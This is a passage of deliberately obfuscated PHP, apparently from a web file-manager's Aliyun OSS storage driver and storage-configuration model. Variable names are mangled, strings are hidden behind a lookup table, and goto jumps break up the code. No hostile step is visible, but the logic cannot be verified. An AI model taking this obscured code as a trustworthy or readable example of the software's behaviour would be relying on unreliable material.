(count($”Ã†Ùè) > 1 || count($”Ã†Ùè) == 1 && $”Ã†Ùè[0]->getKey() != $à½¹¿Í) { $ä°İÅü· += count($”Ã†Ùè) - 1; } if (!empty($¾÷Ôºº·)) { $ÎŸ€µãğ += count($¾÷Ôºº·); } if ($Éö±×Ü === $í‚‹»€[12]) { break; } continue; } if ($êü“Ë•Õ) { if (!empty($”Ã†Ùè)) { if (count($”Ã†Ùè) > 1 || $”Ã†Ùè[0]->getKey() != $à½¹¿Í) { return !0; } } } else { if (!empty($¾÷Ôºº·)) { return !0; } } if ($Éö±×Ü === $í‚‹»€[12]) { break; } } if ($×ûğµÍ) { return array($í‚‹»€[202] => $ä°İÅü·, $í‚‹»€[203] => $ÎŸ€µãğ); } return !1; } public function listAll($¿¢Àì÷§) { $ÃæÑ‘¨« =& $_SERVER[Ãìšã«™]; $»ÕÜâÛõ = $this->fileList($¿¢Àì÷§, $ÃæÑ‘¨«[12], !0); $áÕ­ƒÏ = array(); foreach ($»ÕÜâÛõ[$ÃæÑ‘¨«[76]] as $µ¡òÄîº) { $áÕ­ƒÏ[$µ¡òÄîº[$ÃæÑ‘¨«[32]]] = $µ¡òÄîº[$ÃæÑ‘¨«[80]]; } foreach ($»ÕÜâÛõ[$ÃæÑ‘¨«[77]] as $µ¡òÄîº) { if (is_string($µ¡òÄîº)) { $áÕ­ƒÏ[$µ¡òÄîº] = 0; } } return $this->listAllFiles($¿¢Àì÷§, array_keys($áÕ­ƒÏ), $áÕ­ƒÏ); } public function canRead($ŞäĞÓÓÊ) { $¼èÅøšŒ =& $_SERVER[Ãìšã«™]; $«Şƒ´Äİ = $this->pathAcl($ŞäĞÓÓÊ); return $«Şƒ´Äİ == $¼èÅøšŒ[1400] || $«Şƒ´Äİ == $¼èÅøšŒ[550] ? !0 : !1; } public function canWrite($†‹Êæ‚ã) { $óã×Ãí = $this->pathAcl($†‹Êæ‚ã); return $óã×Ãí == $_SERVER[Ãìšã«™][550] ? !0 : !1; } public function pathAcl($°´§ÃÑ) { $Æ€¶ãÀò =& $_SERVER[Ãìšã«™]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÓøÅ¦ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($°´§ÃÑ)); } catch (OSS\Core\OssException $Ûúû§®Ü) { return !1; } $ÛÇæàŠ = $ÓøÅ¦ == $Æ€¶ãÀò[37] ? $this->bucketAcl : $ÓøÅ¦; if ($ÛÇæàŠ == $Æ€¶ãÀò[1401]) { return $Æ€¶ãÀò[1400]; } if ($ÛÇæàŠ == $Æ€¶ãÀò[1402]) { return $Æ€¶ãÀò[550]; } return $ÛÇæàŠ; } private function chmodPath($üİŒèƒş, $ùüïŒ“Û = '') { $…Úƒ÷ªø =& $_SERVER[Ãìšã«™]; $¨ÙÏÄ­Ã = empty($ùüïŒ“Û) ? $…Úƒ÷ªø[1402] : $ùüïŒ“Û; $·–§£Òù = array($…Úƒ÷ªø[37], $…Úƒ÷ªø[191], $…Úƒ÷ªø[1401], $…Úƒ÷ªø[1402]); if (!in_array($¨ÙÏÄ­Ã, $·–§£Òù)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($üİŒèƒş), $¨ÙÏÄ­Ã); } catch (OSS\Core\OssException $Ğı¥ßù¢) { return !1; } return !0; } public function getContent($„Î‹œ¡) { return $this->fileSubstr($„Î‹œ¡, -1); } public function setContent($¤ŸœÅ˜, $îÌô½àâ = '') { $‚œ‘ğ =& $_SERVER[Ãìšã«™]; try { $›–İê“Ó = $this->trafficLimit($‚œ‘ğ[1403]); $“ÊôÌÄ¹ = $this->client->putObject($this->bucket, $this->pathEncode($¤ŸœÅ˜), $îÌô½àâ, $›–İê“Ó); } catch (OSS\Core\OssException $Ÿüş€ö‘) { return !1; } $ï¤»©³Ù = array($‚œ‘ğ[1393] => trim($“ÊôÌÄ¹[$‚œ‘ğ[1404]], $‚œ‘ğ[117]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¤ŸœÅ˜))); $this->updateObjMeta($¤ŸœÅ˜, $ï¤»©³Ù); return isset($“ÊôÌÄ¹[$‚œ‘ğ[1405]][$‚œ‘ğ[1352]]) ? !0 : !1; } private function updateObjMeta($âúô½ê©, $Â‚‹§²æ) { $âúô½ê© = $this->pathEncode($âúô½ê©); try { $ÃÀ¾óÀ‘ = array(OSS\OssClient::OSS_HEADERS => $Â‚‹§²æ); $this->client->copyObject($this->bucket, $âúô½ê©, $this->bucket, $âúô½ê©, $ÃÀ¾óÀ‘); } catch (OSS\Core\OssException $œ¬ï¦ßÜ) { return !1; } return !0; } public function upload($À“àŠµ­, $·ÇÃô±, $àÄØèÄû = false, $¸Ì³ö‡ = REPEAT_REPLACE) { $©œ•¬¬ª =& $_SERVER[Ãìšã«™]; $ß“ï³ÉË = trim($À“àŠµ­, $©œ•¬¬ª[8]); $¸ãçÕºÁ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($©œ•¬¬ª[1393] => @md5_file($·ÇÃô±)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($À“àŠµ­))); $¸ãçÕºÁ = $this->trafficLimit($©œ•¬¬ª[1403], $¸ãçÕºÁ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ß“ï³ÉË), $·ÇÃô±, $¸ãçÕºÁ); } catch (OSS\Core\OssException $Ğóîœ¯«) { return !1; } return $this->getPathOuter($À“àŠµ­); } public function getHost() { $­ü½´ËŸ =& $_SERVER[Ãìšã«™]; $Ä‡º±è = explode($­ü½´ËŸ[176], parent::getHost()); return $Ä‡º±è[0] . $­ü½´ËŸ[176] . $this->bucket . $­ü½´ËŸ[10] . $Ä‡º±è[1]; } public function uploadFormData($†Ôå¢Öù, $‡ÏØû¿É = 3600) { $½Ï‘â¼› =& $_SERVER[Ãìšã«™]; if (!($Îäß™¡ = $this->getHost())) { return !1; } $³¬Ò¶Š = $‡ÏØû¿É; $À¬½éÍŞ = date($½Ï‘â¼›[1406], time() + $³¬Ò¶Š); $Ò¨ì¥¬ = new DateTime($À¬½éÍŞ); $«úœ·–› = $Ò¨ì¥¬->format(DateTime::ISO8601); $îü×öİ = strpos($«úœ·–›, $½Ï‘â¼›[291]); $«úœ·–› = substr($«úœ·–›, 0, $îü×öİ) . $½Ï‘â¼›[1407]; $¼Š©•â‰ = 1048576000 * 5; $ÃÍ¼çµÔ = $this->pathFather($†Ôå¢Öù); $‚©òš»— = array($½Ï‘â¼›[1306] => $«úœ·–›, $½Ï‘â¼›[1307] => array(array($½Ï‘â¼›[1408], 0, $¼Š©•â‰), array($½Ï‘â¼›[1310], $½Ï‘â¼›[1311], $ÃÍ¼çµÔ))); $ëÇØ’ö = base64_encode(json_encode($‚©òš»—)); $Ãü±·Û½ = base64_encode(hash_hmac($½Ï‘â¼›[227], $ëÇØ’ö, $this->secret, !0)); $ÃŞÖ·ïÓ = array($½Ï‘â¼›[1316] => $ëÇØ’ö, $½Ï‘â¼›[1409] => $this->accessKey, $½Ï‘â¼›[1312] => $½Ï‘â¼›[1304], $½Ï‘â¼›[1410] => $Ãü±·Û½, $½Ï‘â¼›[174] => $Îäß™¡); $ÃŞÖ·ïÓ = $this->trafficLimit($½Ï‘â¼›[1403], $ÃŞÖ·ïÓ); return $ÃŞÖ·ïÓ; } public function multiUploadFormData($™ÛŞô¹, $Ê‹³©º© = 3600) { $„Û³‡ É =& $_SERVER[Ãìšã«™]; if (!($Æöá•½Õ = $this->getHost())) { return !1; } $‡¯¾¢ÛÔ = $this->trafficLimit($„Û³‡ É[1403]); $½Ûô˜ïè = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($™ÛŞô¹), $‡¯¾¢ÛÔ); return array($„Û³‡ É[218] => $½Ûô˜ïè, $„Û³‡ É[174] => $Æöá•½Õ . $„Û³‡ É[8] . $this->pathEncode($™ÛŞô¹), $„Û³‡ É[219] => gmdate($„Û³‡ É[1411]), $„Û³‡ É[95] => $™ÛŞô¹); } public function multiUploadAuthData($è­å›…®, $á¤¯±‰ = array()) { $Ã£ëÛ =& $_SERVER[Ãìšã«™]; $‚à¨æÜ¢ = isset($á¤¯±‰[$Ã£ëÛ[219]]) ? $á¤¯±‰[$Ã£ëÛ[219]] : gmdate($Ã£ëÛ[1411]); $”Ø¨‡¤ = isset($á¤¯±‰[$Ã£ëÛ[167]]) ? $á¤¯±‰[$Ã£ëÛ[167]] : $Ã£ëÛ[12]; $ï´ŞØ¥ã = $è­å›…®; if (isset($á¤¯±‰[$Ã£ëÛ[95]])) { $ï´ŞØ¥ã = $á¤¯±‰[$Ã£ëÛ[95]]; unset($á¤¯±‰[$Ã£ëÛ[95]]); } if (isset($á¤¯±‰[$Ã£ëÛ[220]])) { $á¤¯±‰[$Ã£ëÛ[219]] = $‚à¨æÜ¢; return $this->listUploadParts($ï´ŞØ¥ã, $á¤¯±‰); } $ÚëÄ½¹¿ = array($Ã£ëÛ[221], $Ã£ëÛ[12], $Ã£ëÛ[118], $‚à¨æÜ¢, "\x78\x2d\157\x73\163\x2d\x64\x61\x74\x65\72{$‚à¨æÜ¢}", $Ã£ëÛ[8] . $this->bucket . $Ã£ëÛ[8] . $ï´ŞØ¥ã . $”Ø¨‡¤); if (strpos($”Ø¨‡¤, $Ã£ëÛ[222]) === 0) { $ÚëÄ½¹¿[0] = $Ã£ëÛ[223]; if ($Úê„ˆŞÜ = $this->trafficLimit($Ã£ëÛ[1403])) { $ï´ŞØ¥ã = $Ã£ëÛ[1412]; array_splice($ÚëÄ½¹¿, 5, 0, $ï´ŞØ¥ã . $Ã£ëÛ[4] . $Úê„ˆŞÜ[$ï´ŞØ¥ã]); } } if (isset($á¤¯±‰[$Ã£ëÛ[224]]) && $á¤¯±‰[$Ã£ëÛ[224]] == $Ã£ëÛ[225]) { $ÚëÄ½¹¿[0] = $Ã£ëÛ[225]; } if (!empty($á¤¯±‰[$Ã£ëÛ[1413]])) { $şŞ˜È… = array_merge(array($ÚëÄ½¹¿[4]), $á¤¯±‰[$Ã£ëÛ[1413]]); sort($şŞ˜È…); $ÚëÄ½¹¿[4] = implode($Ã£ëÛ[226], $şŞ˜È…); } $î·š›çÊ = implode($Ã£ëÛ[226], $ÚëÄ½¹¿); $”şùÆÖ = base64_encode(hash_hmac($Ã£ëÛ[227], $î·š›çÊ, $this->secret, !0)); $Â€Š‹¦î = $Ã£ëÛ[1377] . $this->accessKey . $Ã£ëÛ[4] . $”şùÆÖ; if (strpos($”Ø¨‡¤, $Ã£ëÛ[222]) === 0) { $Â€Š‹¦î = array($Ã£ëÛ[229] => $Â€Š‹¦î, $Ã£ëÛ[219] => $‚à¨æÜ¢); if ($Úê„ˆŞÜ) { $Â€Š‹¦î = array_merge($Â€Š‹¦î, $Úê„ˆŞÜ); } } return $Â€Š‹¦î; } public function listUploadParts($–’ë×š, $¾¼’øÇ™) { $ğöÌ÷İª =& $_SERVER[Ãìšã«™]; $üĞş¹øí = parse_url_query($¾¼’øÇ™[$ğöÌ÷İª[167]]); $“ûŸ¨®ì = $this->client->listParts($this->bucket, $this->pathEncode($–’ë×š), $üĞş¹øí[$ğöÌ÷İª[218]]); $ªÏ³æ˜Ù = $“ûŸ¨®ì->getListPart(); $ËŠ†ß×¬ = array(); foreach ($ªÏ³æ˜Ù as $í•Ñü°) { $ËŠ†ß×¬[] = array($ğöÌ÷İª[1397] => $í•Ñü°->getPartNumber(), $ğöÌ÷İª[1398] => trim($í•Ñü°->getETag(), $ğöÌ÷İª[117])); } unset($¾¼’øÇ™[$ğöÌ÷İª[220]], $¾¼’øÇ™[$ğöÌ÷İª[224]]); $Û½Â£ = $this->multiUploadAuthData($–’ë×š, $¾¼’øÇ™); if (empty($Û½Â£)) { return !1; } return array($ğöÌ÷İª[229] => $Û½Â£, $ğöÌ÷İª[219] => $¾¼’øÇ™[$ğöÌ÷İª[219]], $ğöÌ÷İª[231] => $ËŠ†ß×¬); } public function download($ü±ŒÌÁ·, $ĞŸÛÉƒÄ) { if ($this->isFolder($ü±ŒÌÁ·)) { return !1; } try { $õ´’Ğİ¶ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ĞŸÛÉƒÄ); $õ´’Ğİ¶ = $this->trafficLimit($_SERVER[Ãìšã«™][110], $õ´’Ğİ¶); $this->client->getObject($this->bucket, $this->pathEncode($ü±ŒÌÁ·), $õ´’Ğİ¶); } catch (OSS\Core\OssException $Şá›‡ÔÜ) { return !1; } return $ĞŸÛÉƒÄ; } public function fileSubstr($©æ„Ì”½, $´ÙÙÙÀ = 0, $–Ş”¤ = false) { if ($´ÙÙÙÀ === -1) { $ïí¢ºê° = array(); } else { if ($–Ş”¤ === !1) { $ŞÇ©çñè = $this->size($©æ„Ì”½); } else { $ŞÇ©çñè = $´ÙÙÙÀ + $–Ş”¤ - 1; } $ïí¢ºê° = array(OSS\OssClient::OSS_RANGE => "{$´ÙÙÙÀ}\55{$ŞÇ©çñè}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($©æ„Ì”½), $ïí¢ºê°); } catch (OSS\Core\OssException $ŞãÄí) { think_exception($ŞãÄí->getMessage()); return !1; } } private function trafficLimit($‚Ã‘îÀï, $ùì¨»ú = array()) { $ÉÃÇêÏ  =& $_SERVER[Ãìšã«™]; if ($‚Ã‘îÀï == $ÉÃÇêÏ [1403] && $this->isUploadServer() || $‚Ã‘îÀï == $ÉÃÇêÏ [110] && $this->isFileOutServer()) { return $ùì¨»ú; } $ÒÇÕúÃ÷ = floatval($GLOBALS[$ÉÃÇêÏ [6]][$ÉÃÇêÏ [90]][$ÉÃÇêÏ [108]][$‚Ã‘îÀï]) * 1024 * 1024 * 8; if (!$ÒÇÕúÃ÷) { return $ùì¨»ú; } $ÒÇÕúÃ÷ = $ÒÇÕúÃ÷ < 819200 ? 819200 : ($ÒÇÕúÃ÷ > 838860800 ? 838860800 : $ÒÇÕúÃ÷); $ùì¨»ú[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÒÇÕúÃ÷); return $ùì¨»ú; } public function link($÷ËÓéˆ, $†¥¦¯àÈ = array()) { $±åßÀ =& $_SERVER[Ãìšã«™]; if (!$this->exist($÷ËÓéˆ) || $this->isFolder($÷ËÓéˆ)) { return !1; } try { $†¥¦¯àÈ = $this->trafficLimit($±åßÀ[110], $†¥¦¯àÈ); $íüŠíã = $this->client->signUrl($this->bucket, $this->pathEncode($÷ËÓéˆ), 3600 * 12, $±åßÀ[225], $†¥¦¯àÈ); return $this->getCdnLink($íüŠíã); } catch (OSS\Core\OssException $¢ëé› ») { return !1; } } public function fileOut($èø¤ñ„Å, $ÙÅÅ¾Ç = false, $“ëşÕÃá = false, $ñì¢ˆê¨ = '') { $»¤…Êå =& $_SERVER[Ãìšã«™]; if ($this->isFileOutServer()) { return $this->fileOutServer($èø¤ñ„Å, $ÙÅÅ¾Ç, $“ëşÕÃá, $ñì¢ˆê¨); } if (!$“ëşÕÃá) { $“ëşÕÃá = $this->pathThis($èø¤ñ„Å); } $“ëşÕÃá = rawurlencode($“ëşÕÃá); $—„¯Ê° = get_file_mime(get_path_ext($“ëşÕÃá)); if ($—„¯Ê° == $»¤…Êå[212]) { return parent::fileOut($èø¤ñ„Å, $ÙÅÅ¾Ç, $“ëşÕÃá, $ñì¢ˆê¨); } $ÙÅÅ¾Ç = $ÙÅÅ¾Ç ? $»¤…Êå[1414] : $»¤…Êå[1415]; $§¹Àù£¬ = array(OSS\OssClient::OSS_SUB_RESOURCE => $»¤…Êå[1416] . rawurlencode("{$ÙÅÅ¾Ç}\73\146\x69\x6c\145\x6e\141\155\x65\75{$“ëşÕÃá}")); $§¹Àù£¬[OSS\OssClient::OSS_SUB_RESOURCE] .= $»¤…Êå[1417] . rawurlencode($—„¯Ê°); $ü÷İËÅô = $this->link($èø¤ñ„Å, $§¹Àù£¬); $this->fileOutLink($ü÷İËÅô); } public function fileOutServer($‰Ï¹ò¹£, $“ÛÈç¤º = false, $”…àÌ “ = false, $ÃœŞÎÉ = '') { parent::fileOut($‰Ï¹ò¹£, $“ÛÈç¤º, $”…àÌ “, $ÃœŞÎÉ); } public function fileOutImage($â¥õÈÁ, $¦©›íİà = 250) { $¯ ÈåãÍ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ãìšã«™][1418] . $¦©›íİà); $ı¦›Ï‡± = $this->link($â¥õÈÁ, $¯ ÈåãÍ); $this->fileOutLink($ı¦›Ï‡±); } public function fileOutImageServer($—•¥ì°, $ş¡…ûÂ¹ = 250) { parent::fileOutImage($—•¥ì°, $ş¡…ûÂ¹); } public function fileOutLink($Ş¸úÕ‹ˆ) { $„îö¶»æ =& $_SERVER[Ãìšã«™]; if (!$this->isCdnHost() && substr($Ş¸úÕ‹ˆ, 0, 7) == $„îö¶»æ[1319]) { $Ş¸úÕ‹ˆ = $„îö¶»æ[1320] . substr($Ş¸úÕ‹ˆ, 7); } header($„îö¶»æ[158] . $Ş¸úÕ‹ˆ); die; } public function hashMd5($Á€Ãã¾, $½¯Ÿ¢½İ = '') { $ß¼åÅíÒ =& $_SERVER[Ãìšã«™]; $şôùÖ’½ = $this->_objectMeta($Á€Ãã¾); if (!$şôùÖ’½) { return $ß¼åÅíÒ[12]; } if (!isset($şôùÖ’½[$ß¼åÅíÒ[1393]]) && !empty($½¯Ÿ¢½İ)) { $èŞõÉœü = $this->updateObjMeta($Á€Ãã¾, array($ß¼åÅíÒ[1393] => $½¯Ÿ¢½İ)); $şôùÖ’½[$ß¼åÅíÒ[1393]] = $èŞõÉœü ? $½¯Ÿ¢½İ : $ß¼åÅíÒ[12]; } return isset($şôùÖ’½[$ß¼åÅíÒ[1393]]) ? strtolower($şôùÖ’½[$ß¼åÅíÒ[1393]]) : $ß¼åÅíÒ[12]; } public function size($ö™„óÉå) { $Åñ¢Ÿ»µ = $this->objectMeta($ö™„óÉå); return $Åñ¢Ÿ»µ ? $Åñ¢Ÿ»µ[$_SERVER[Ãìšã«™][80]] : 0; } public function info($ ¬Áö¨) { if ($this->isFolder($ ¬Áö¨)) { return $this->folderInfo($ ¬Áö¨); } else { if ($this->isFile($ ¬Áö¨)) { return $this->fileInfo($ ¬Áö¨); } } return !1; } public function exist($î¼Ùá¼û) { return $this->isFile($î¼Ùá¼û) || $this->isFolder($î¼Ùá¼û); } public function isFile($˜‡÷ÑÃª) { return !$this->isFolder($˜‡÷ÑÃª) && $this->objectMeta($˜‡÷ÑÃª); } public function isFolder($Éşç×†é) { return $this->cacheMethod($_SERVER[Ãìšã«™][198], $Éşç×†é); } protected function objectMeta($¢Ø›Ò´Œ) { return $this->cacheMethod($_SERVER[Ãìšã«™][199], $¢Ø›Ò´Œ); } protected function _objectMeta($ºûòÄë¢) { $½µ«®¾º =& $_SERVER[Ãìšã«™]; try { $´‘üÇõ® = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ºûòÄë¢)); } catch (OSS\Core\OssException $ª„ÀÊì¯) { $´‘üÇõ® = !1; } if ($´‘üÇõ®) { $´‘üÇõ®[$½µ«®¾º[80]] = intval($´‘üÇõ®[$½µ«®¾º[1391]]); } return $´‘üÇõ®; } protected function _isFolder($ï®÷ÖÔò) { $ßÃÃ­¡Ë =& $_SERVER[Ãìšã«™]; if ($ï®÷ÖÔò == $ßÃÃ­¡Ë[12] || $ï®÷ÖÔò == $ßÃÃ­¡Ë[8]) { return !0; } $ šï’·€ = array($ßÃÃ­¡Ë[1387] => $ßÃÃ­¡Ë[8], $ßÃÃ­¡Ë[1388] => rtrim($ï®÷ÖÔò, $ßÃÃ­¡Ë[8]) . $ßÃÃ­¡Ë[8], $ßÃÃ­¡Ë[1389] => 1, $ßÃÃ­¡Ë[1390] => $ßÃÃ­¡Ë[12]); $Ç¬Úäë½ = $this->client->listObjects($this->bucket, $ šï’·€); if ($Ç¬Úäë½->getObjectList() || $Ç¬Úäë½->getPrefixList()) { return !0; } return !1; } } goto Bãæ‰•™«…; fÃô‹’Ë–ã: class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\56\x73\164\157\162\x61\x67\145\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\x73\151\x7a\145\115\141\170", "\163\x79\x73\164\x65\155", "\x64\145\x66\x61\165\154\164", "\x64\x72\151\x76\x65\x72", "\143\157\x6e\x66\151\x67"); public function listData($òõÈÖöÀ = false, $›¯Î¬Œº = "\155\x6f\144\x69\146\171\x54\x69\155\x65", $üı¸Æ† = false) { $»ãûÈ¤  =& $_SERVER[Ãìšã«™]; $œè‹´€Œ = parent::listData($òõÈÖöÀ, $›¯Î¬Œº, $üı¸Æ†); if ($òõÈÖöÀ) { return $œè‹´€Œ; } $öœ÷Êí½ = $this->ioSizeUseGet(array_to_keyvalue($œè‹´€Œ, $»ãûÈ¤ [12], $»ãûÈ¤ [392])); foreach ($œè‹´€Œ as $íîøĞî§ => $Ô®»™‚ê) { unset($œè‹´€Œ[$íîøĞî§][$»ãûÈ¤ [6]]); $œè‹´€Œ[$íîøĞî§][$»ãûÈ¤ [1807]] = isset($öœ÷Êí½[$Ô®»™‚ê[$»ãûÈ¤ [392]]]) ? $öœ÷Êí½[$Ô®»™‚ê[$»ãûÈ¤ [392]]] : 0; } return $œè‹´€Œ; } public function ioSizeUseGet($ø‹Ï‘â) { $×—öª÷à =& $_SERVER[Ãìšã«™]; if (!$ø‹Ï‘â) { return array(); } $¥Ô¯ıı = $×—öª÷à[2121] . implode($×—öª÷à[50], $ø‹Ï‘â); $İ…°Üç³ = Cache::get($¥Ô¯ıı); if ($İ…°Üç³) { return $İ…°Üç³; } $ôù´Ô = array($×—öª÷à[818] => $×—öª÷à[392], $×—öª÷à[2122] => $×—öª÷à[80]); $Ò±ªÜùü = array($×—öª÷à[818] => array($×—öª÷à[7], $ø‹Ï‘â)); $İ…°Üç³ = Model($×—öª÷à[790])->field($ôù´Ô)->where($Ò±ªÜùü)->group($×—öª÷à[818])->select(); $İ…°Üç³ = array_to_keyvalue($İ…°Üç³, $×—öª÷à[392], $×—öª÷à[80]); Cache::set($¥Ô¯ıı, $İ…°Üç³, 600); return $İ…°Üç³; } public function getConfig($²“á†¡’) { $šéïò = parent::listData($²“á†¡’); return json_decode($šéïò[$_SERVER[Ãìšã«™][6]], !0); } public function update($ó²ü•Í‘, $·¶Ù•€›) { $ı¯¢¹¿§ =& $_SERVER[Ãìšã«™]; $œÏÜËŞ´ = $·¶Ù•€›[$ı¯¢¹¿§[32]]; $ÈÅ¼€ïƒ = array_to_keyvalue(parent::listData(), $ı¯¢¹¿§[32]); if (isset($ÈÅ¼€ïƒ[$œÏÜËŞ´]) && $ÈÅ¼€ïƒ[$œÏÜËŞ´][$ı¯¢¹¿§[392]] != $ó²ü•Í‘) { return !1; } if (isset($·¶Ù•€›[$ı¯¢¹¿§[2123]]) && $·¶Ù•€›[$ı¯¢¹¿§[2123]] == $ı¯¢¹¿§[89]) { $this->checkConfig($·¶Ù•€›); } unset($·¶Ù•€›[$ı¯¢¹¿§[2123]]); $íŸØÙµ‰ = parent::update($ó²ü•Í‘, $·¶Ù•€›); if ($íŸØÙµ‰ && $·¶Ù•€›[$ı¯¢¹¿§[37]]) { foreach ($ÈÅ¼€ïƒ as $öØ€ÄÏì) { if ($öØ€ÄÏì[$ı¯¢¹¿§[37]] && $öØ€ÄÏì[$ı¯¢¹¿§[392]] != $ó²ü•Í‘) { parent::update($öØ€ÄÏì[$ı¯¢¹¿§[392]], array($ı¯¢¹¿§[37] => 0)); } } } return $íŸØÙµ‰; } public function add($ÙÑ†Ú‘) { $ğ¥şÇãÅ =& $_SERVER[Ãìšã«™]; $Ë•¼Çê· = array_to_keyvalue(parent::listData(), $ğ¥şÇãÅ[32]); if (isset($Ë•¼Çê·[$ÙÑ†Ú‘[$ğ¥şÇãÅ[32]]])) { return !1; } $this->checkConfig($ÙÑ†Ú‘); $™®§’ÇÒ = parent::insert($ÙÑ†Ú‘); if ($™®§’ÇÒ && $ÙÑ†Ú‘[$ğ¥şÇãÅ[37]]) { foreach ($Ë•¼Çê· as $¶…Û¹Õú) { if ($¶…Û¹Õú[$ğ¥şÇãÅ[37]]) { parent::update($¶…Û¹Õú[$ğ¥şÇãÅ[392]], array($ğ¥şÇãÅ[37] => 0)); } } } return $™®§’ÇÒ; } public function checkConfig(&$œº¯”†€, $Îéõó€Ã = false) { $Ò„œô‡£ =& $_SERVER[Ãìšã«™]; $Üî›¬Æá = strtolower($œº¯”†€[$Ò„œô‡£[96]]); $©À÷Ó¯Ğ = json_decode($œº¯”†€[$Ò„œô‡£[6]], !0); foreach ($©À÷Ó¯Ğ as $ı…ï¯—û => $àÒ¹ëèŞ) { $©À÷Ó¯Ğ[$ı…ï¯—û] = trim($àÒ¹ëèŞ); } $©À÷Ó¯Ğ[$Ò„œô‡£[2124]] = rand_string(6); $‰°á“ˆÚ = $GLOBALS[$Ò„œô‡£[6]][$Ò„œô‡£[90]][$Ò„œô‡£[827]]; $ÒÀáâŞ = isset($‰°á“ˆÚ[$Üî›¬Æá]) ? $‰°á“ˆÚ[$Üî›¬Æá] : ucfirst($Üî›¬Æá); $Æı“à•× = $Ò„œô‡£[74] . $ÒÀáâŞ; if (!$ÒÀáâŞ || !class_exists($Æı“à•×)) { if ($Îéõó€Ã) { return LNG($Ò„œô‡£[2125]); } write_log(array($Ò„œô‡£[2126], $œº¯”†€, get_caller_info()), $Ò„œô‡£[2127]); show_json(LNG($Ò„œô‡£[2125]), !1, $œº¯”†€); } $°î´”©” = new $Æı“à•×($©À÷Ó¯Ğ); if (in_array($Üî›¬Æá, $°î´”©”->objectDriver)) { if (!$°î´”©”->isBucketCors() && !$°î´”©”->setBucketCors()) { $ Ø·ŸØß = LNG($Ò„œô‡£[2128]); $ Ø·ŸØß .= $Ò„œô‡£[2129] . LNG($Ò„œô‡£[2130]); if ($Îéõó€Ã) { return $ Ø·ŸØß; } show_json($ Ø·ŸØß, !1); } } $µºĞüÁò = rtrim($©À÷Ó¯Ğ[$Ò„œô‡£[1175]], $Ò„œô‡£[8]) . $Ò„œô‡£[8]; $óÜÉù = $°î´”©”->getPath($µºĞüÁò . $Ò„œô‡£[1237]); if (!$°î´”©”->mkfile($óÜÉù)) { if ($Îéõó€Ã) { return LNG($Ò„œô‡£[2128]); } show_json(LNG($Ò„œô‡£[2128]), !1); } $©À÷Ó¯Ğ[$Ò„œô‡£[1175]] = $µºĞüÁò; $œº¯”†€[$Ò„œô‡£[6]] = json_encode($©À÷Ó¯Ğ); $œº¯”†€[$Ò„œô‡£[96]] = $ÒÀáâŞ; return !0; } public function driverListSystem() { $ü°çÂè­ =& $_SERVER[Ãìšã«™]; $Ù¡ÎÛª¦ = parent::listData(); $ŒÑ ªÅ¼ = array(); foreach ($Ù¡ÎÛª¦ as $üÅ¨ÂÆš) { unset($üÅ¨ÂÆš[$ü°çÂè­[193]], $üÅ¨ÂÆš[$ü°çÂè­[86]]); $üÅ¨ÂÆš[$ü°çÂè­[6]] = json_decode($üÅ¨ÂÆš[$ü°çÂè­[6]], !0); $ŒÑ ªÅ¼[] = $üÅ¨ÂÆš; } return $ŒÑ ªÅ¼; } public function defaultDriver() { $ÃƒÖš¬Ş =& $_SERVER[Ãìšã«™]; $šÜï­¥ = parent::listData(); $ùÜİ•Æô = array_filter_by_field($šÜï­¥, $ÃƒÖš¬Ş[37], 1); $ùÜİ•Æô = $ùÜİ•Æô[0]; if ($ùÜİ•Æô) { $ùÜİ•Æô[$ÃƒÖš¬Ş[6]] = json_decode($ùÜİ•Æô[$ÃƒÖš¬Ş[6]], !0); } return $ùÜİ•Æô; } public function driverInfo($Ğû…Ùî) { $ƒ‰åİÈŞ =& $_SERVER[Ãìšã«™]; $ó ¬Îó” = array_to_keyvalue(parent::listData(), $ƒ‰åİÈŞ[392]); if (!isset($ó ¬Îó”[$Ğû…Ùî])) { return !1; } $ìÛÅÂ¾ô = $ó ¬Îó”[$Ğû…Ùî]; $ìÛÅÂ¾ô[$ƒ‰åİÈŞ[6]] = json_decode($ìÛÅÂ¾ô[$ƒ‰åİÈŞ[6]], !0); return $ìÛÅÂ¾ô; } public function remove($Í½€í˜§) { $this->removeShareItems($Í½€í˜§); return parent::remove($Í½€í˜§); } public function removeWithFile($âı˜Âí„, $ËÎ ¶“Û) { $­©°¹¹Ÿ =& $_SERVER[Ãìšã«™]; $éöÃ‘üû = array($­©°¹¹Ÿ[818] => $âı˜Âí„); $ˆÑ¯Æºı = Model($­©°¹¹Ÿ[470])->where($éöÃ‘üû)->count(); $ãË÷¬ô¸ = Model($­©°¹¹Ÿ[470])->where($éöÃ‘üû)->sum($­©°¹¹Ÿ[80]); $ŸÌƒëŒ‘ = $ËÎ ¶“Û . $­©°¹¹Ÿ[2131] . $âı˜Âí„; $¶ÓÃšŞş = new TaskFileTransfer($ŸÌƒëŒ‘, $­©°¹¹Ÿ[2127], $ˆÑ¯Æºı, LNG($­©°¹¹Ÿ[2132]) . "\x28{$âı˜Âí„}\x29"); $¶ÓÃšŞş->task[$­©°¹¹Ÿ[764]] = (double) $ãË÷¬ô¸; $±”ãàÃ = KodIO::defaultDriver(); $¼ÃÍ•º = $±”ãàÃ[$­©°¹¹Ÿ[392]]; $Ä¯™å±Ê = "\173\151\x6f\72{$¼ÃÍ•º}\x7d\x2f"; $‚©ª§Í = !0; $©Ûá¼Öè = array(); $óüãµµé = Model($­©°¹¹Ÿ[192])->where($éöÃ‘üû)->field($­©°¹¹Ÿ[2133])->select(); foreach ($óüãµµé as $¾“„ ½) { 